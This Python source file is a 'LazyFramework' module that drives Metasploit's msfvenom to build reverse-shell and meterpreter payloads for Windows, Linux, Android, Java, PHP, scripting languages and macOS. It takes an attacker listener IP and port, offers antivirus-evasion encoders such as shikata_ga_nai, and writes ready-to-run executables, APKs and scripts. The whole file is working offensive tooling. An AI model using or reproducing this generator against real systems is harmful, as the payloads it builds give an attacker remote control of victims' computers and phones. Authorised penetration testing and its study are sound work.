#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LazyFramework Module: msfvenom Payload Generator
Generate payloads using msfvenom with correct format handling per platform.
"""

import os
import shutil
import subprocess
from datetime import datetime
from pathlib import Path

MODULE_INFO = {
    "name": "msfvenom",
    "description": "Generate payloads using msfvenom (Windows/Linux/Android/Java/PHP/Python/OSX)",
    "author": "LazyFramework",
    "license": "MIT",
    "rank": "excellent",
    "types": "payload",
    "category": "payload",
    "platform": "multi",
    "arch": "multi",
    "dependencies": [],
    "references": [
        "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html",
    ],
}

PAYLOAD_FORMATS = {
    "windows/meterpreter/reverse_tcp": ["exe", "dll", "raw", "ps1", "vba", "hex", "c", "python"],
    "windows/meterpreter/reverse_https": ["exe", "dll", "raw", "ps1", "vba"],
    "windows/meterpreter/bind_tcp": ["exe", "dll", "raw"],
    "windows/shell_reverse_tcp": ["exe", "dll", "raw", "ps1"],
    "windows/shell_bind_tcp": ["exe", "dll", "raw"],
    "windows/x64/meterpreter/reverse_tcp": ["exe", "dll", "raw"],
    "windows/x64/shell_reverse_tcp": ["exe", "dll", "raw"],
    "android/meterpreter/reverse_tcp": ["apk"],
    "android/meterpreter/reverse_http": ["apk"],
    "android/meterpreter/reverse_https": ["apk"],
    "android/shell/reverse_tcp": ["apk"],
    "linux/x86/meterpreter/reverse_tcp": ["elf", "python", "raw", "c"],
    "linux/x64/meterpreter/reverse_tcp": ["elf", "python", "raw", "c"],
    "linux/x86/shell_reverse_tcp": ["elf", "python", "raw"],
    "linux/x64/shell_reverse_tcp": ["elf", "python", "raw"],
    "php/meterpreter/reverse_tcp": ["raw"],
    "php/shell_reverse_tcp": ["raw"],
    "java/meterpreter/reverse_tcp": ["jar", "war", "raw"],
    "java/shell_reverse_tcp": ["jar", "war"],
    "python/meterpreter/reverse_tcp": ["py", "raw"],
    "python/shell_reverse_tcp": ["py", "raw"],
    "ruby/shell_reverse_tcp": ["rb", "raw"],
    "ruby/meterpreter/reverse_tcp": ["rb", "raw"],
    "perl/shell_reverse_tcp": ["pl", "raw"],
    "cmd/windows/reverse_powershell": ["ps1", "raw"],
    "cmd/windows/bind_powershell": ["ps1", "raw"],
    "osx/x64/meterpreter/reverse_tcp": ["macho", "raw"],
    "osx/x64/shell_reverse_tcp": ["macho", "raw"],
}

NO_FORMAT_TYPES = {"apk", "dex"}
NO_FORMAT_PAYLOADS = {
    "android/meterpreter/reverse_tcp",
    "android/meterpreter/reverse_http",
    "android/meterpreter/reverse_https",
    "android/shell/reverse_tcp",
}

EXT_MAP = {
    "apk": "apk", "exe": "exe", "elf": "elf", "dll": "dll",
    "msi": "msi", "dex": "dex", "war": "war", "asp": "asp",
    "aspx": "aspx", "jar": "jar", "py": "py", "raw": "bin",
    "php": "php", "vba": "vba", "js": "js", "rb": "rb",
    "pl": "pl", "go": "go", "c": "c", "cpp": "cpp",
    "ps1": "ps1", "hex": "hex", "macho": "macho", "osx-app": "app",
    "python": "py", "ruby": "rb", "perl": "pl",
}

ENCODERS = [
    "none",
    "x86/shikata_ga_nai",
    "x86/jmp_call_additive",
    "x86/call4_dword_xor",
    "x86/alpha_mixed",
    "x86/alpha_upper",
    "x64/xor",
    "x64/zutto_dekiru",
]

OPTIONS = {
    "PAYLOAD": {
        "default": "windows/meterpreter/reverse_tcp",
        "required": True,
        "description": "msfvenom payload name",
        "choices": sorted(PAYLOAD_FORMATS.keys()),
    },
    "FORMAT": {
        "default": "exe",
        "required": True,
        "description": "Output format (apk for Android = no -f flag)",
        "choices": [
            "exe", "dll", "elf", "apk", "jar", "war", "raw", "ps1",
            "vba", "hex", "c", "python", "py", "rb", "pl", "macho", "php",
        ],
    },
    "LHOST": {
        "default": "0.0.0.0",
        "required": True,
        "description": "Listener host / attacker IP",
    },
    "LPORT": {
        "default": "4444",
        "required": True,
        "description": "Listener port",
    },
    "ENCODER": {
        "default": "none",
        "required": False,
        "description": "msfvenom encoder",
        "choices": ENCODERS,
    },
    "ITERATIONS": {
        "default": "1",
        "required": False,
        "description": "Encoder iterations (1-20)",
    },
    "OUTPUT": {
        "default": "",
        "required": False,
        "description": "Output file path (empty = auto under ~/msfvenom_payloads/)",
    },
    "EXTRA": {
        "default": "",
        "required": False,
        "description": "Extra msfvenom args (e.g. -x template.apk)",
    },
}


def _get_console():
    try:
        from rich.console import Console
        return Console()
    except ImportError:
        class _Fallback:
            def print(self, *a, **k):
                text = " ".join(str(x) for x in a)
                import re
                print(re.sub(r"\[/?[^\]]+\]", "", text))
        return _Fallback()


def _find_msfvenom():
    path = shutil.which("msfvenom")
    if path:
        return path
    for p in (
        "/usr/bin/msfvenom",
        "/usr/local/bin/msfvenom",
        "/opt/metasploit/bin/msfvenom",
        "/usr/share/metasploit-framework/bin/msfvenom",
        "/snap/bin/msfvenom",
    ):
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None


def _default_output(payload: str, fmt: str) -> str:
    out_dir = Path.home() / "msfvenom_payloads"
    out_dir.mkdir(parents=True, exist_ok=True)
    if payload in NO_FORMAT_PAYLOADS or fmt in NO_FORMAT_TYPES:
        ext = "apk"
    else:
        ext = EXT_MAP.get(fmt, fmt if fmt else "bin")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = payload.replace("/", "_")
    return str(out_dir / f"{safe}_{ts}.{ext}")


def _build_cmd(msf, payload, fmt, lhost, lport, encoder, iterations, output, extra):
    cmd = [msf, "-p", payload]

    if payload not in NO_FORMAT_PAYLOADS and fmt not in NO_FORMAT_TYPES:
        cmd.extend(["-f", fmt])

    cmd.extend(["-o", output])

    if lhost:
        cmd.append(f"LHOST={lhost}")
    if lport:
        cmd.append(f"LPORT={lport}")

    if encoder and encoder.lower() != "none":
        cmd.extend(["-e", encoder, "-i", str(iterations or "1")])

    if extra and extra.strip():
        cmd.extend(extra.strip().split())

    return cmd


def _print_config_table(console, msf, payload, fmt, lhost, lport, encoder, iterations, output, no_f):
    try:
        from rich.table import Table
        from rich.panel import Panel
        from rich import box

        table = Table(
            box=box.SIMPLE_HEAVY,
            show_header=True,
            header_style="bold white",
            expand=False,
        )
        table.add_column("Option", style="bold cyan", width=14)
        table.add_column("Value", style="white", min_width=40)

        table.add_row("msfvenom", msf)
        table.add_row("PAYLOAD", payload)
        table.add_row("FORMAT", f"{fmt}  [dim](no -f)[/dim]" if no_f else fmt)
        table.add_row("LHOST", lhost or "[dim]not set[/dim]")
        table.add_row("LPORT", lport or "[dim]not set[/dim]")
        table.add_row("ENCODER", encoder if encoder and encoder != "none" else "[dim]none[/dim]")
        if encoder and encoder.lower() != "none":
            table.add_row("ITERATIONS", str(iterations))
        table.add_row("OUTPUT", output)

        console.print(Panel(table, title="[bold]msfvenom Generator[/bold]", border_style="cyan", expand=False))
    except ImportError:
        console.print(f"[*] msfvenom : {msf}")
        console.print(f"[*] PAYLOAD  : {payload}")
        console.print(f"[*] FORMAT   : {fmt}{' (no -f)' if no_f else ''}")
        console.print(f"[*] LHOST    : {lhost}")
        console.print(f"[*] LPORT    : {lport}")
        console.print(f"[*] ENCODER  : {encoder}")
        console.print(f"[*] OUTPUT   : {output}")


def _print_result_table(console, success, output, size, returncode, cmd_str):
    try:
        from rich.table import Table
        from rich.panel import Panel
        from rich import box

        table = Table(
            box=box.SIMPLE_HEAVY,
            show_header=True,
            header_style="bold white",
            expand=False,
        )
        table.add_column("Field", style="bold cyan", width=14)
        table.add_column("Value", style="white", min_width=40)

        status = "[bold green]SUCCESS[/bold green]" if success else f"[bold red]FAILED (exit {returncode})[/bold red]"
        table.add_row("Status", status)
        if success:
            table.add_row("File", output)
            table.add_row("Size", f"{size} bytes")
        table.add_row("Command", f"[dim]{cmd_str}[/dim]")

        border = "green" if success else "red"
        title = "[bold green]Payload Generated[/bold green]" if success else "[bold red]Generation Failed[/bold red]"
        console.print(Panel(table, title=title, border_style=border, expand=False))
    except ImportError:
        if success:
            console.print(f"[+] Payload saved: {output} ({size} bytes)")
        else:
            console.print(f"[!] msfvenom failed (exit {returncode})")


def run(session, options):
    console = _get_console()

    payload = str(options.get("PAYLOAD", "windows/meterpreter/reverse_tcp")).strip()
    fmt = str(options.get("FORMAT", "exe")).strip().lower()
    lhost = str(options.get("LHOST", "")).strip()
    lport = str(options.get("LPORT", "4444")).strip()
    encoder = str(options.get("ENCODER", "none")).strip()
    iterations = str(options.get("ITERATIONS", "1")).strip()
    output = str(options.get("OUTPUT", "")).strip()
    extra = str(options.get("EXTRA", "")).strip()

    msf = _find_msfvenom()
    if not msf:
        try:
            from rich.panel import Panel
            console.print(Panel(
                "[red]msfvenom not found.[/red]\nInstall Metasploit Framework or ensure it is in PATH.",
                title="[bold red]Error[/bold red]",
                border_style="red",
            ))
        except ImportError:
            console.print("[!] msfvenom not found. Install Metasploit Framework.")
        return False

    valid = PAYLOAD_FORMATS.get(payload)
    if valid is not None and fmt not in valid and fmt not in NO_FORMAT_TYPES:
        console.print(
            f"[yellow][!] Format '{fmt}' may be invalid for {payload}. "
            f"Suggested: {', '.join(valid)}[/yellow]"
        )

    if not output:
        output = _default_output(payload, fmt)

    Path(output).parent.mkdir(parents=True, exist_ok=True)

    no_f = payload in NO_FORMAT_PAYLOADS or fmt in NO_FORMAT_TYPES
    cmd = _build_cmd(msf, payload, fmt, lhost, lport, encoder, iterations, output, extra)
    cmd_str = " ".join(f'"{c}"' if " " in c else c for c in cmd)

    _print_config_table(console, msf, payload, fmt, lhost, lport, encoder, iterations, output, no_f)
    console.print("[yellow][*] Building payload...[/yellow]")

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300,
            env=os.environ.copy(),
        )

        if proc.stdout:
            for line in proc.stdout.strip().splitlines():
                console.print(f"[dim]{line}[/dim]")
        if proc.stderr:
            for line in proc.stderr.strip().splitlines():
                low = line.lower()
                if "error" in low or "invalid" in low:
                    console.print(f"[red]{line}[/red]")
                else:
                    console.print(f"[dim]{line}[/dim]")

        success = proc.returncode == 0 and os.path.isfile(output)
        size = os.path.getsize(output) if success else 0

        _print_result_table(console, success, output, size, proc.returncode, cmd_str)

        if success:
            if session is not None and isinstance(session, dict):
                session["last_payload"] = output
            return output

        if proc.stderr and "invalid format" in proc.stderr.lower():
            console.print(
                "[yellow][!] Tip: Android payloads → set FORMAT=apk "
                "(module automatically omits -f)[/yellow]"
            )
        return False

    except subprocess.TimeoutExpired:
        try:
            from rich.panel import Panel
            console.print(Panel(
                "[red]Timeout after 300 seconds[/red]",
                title="[bold red]Timeout[/bold red]",
                border_style="red",
            ))
        except ImportError:
            console.print("[!] Timeout (300s)")
        return False
    except Exception as e:
        console.print(f"[red][!] Error: {e}[/red]")
        return False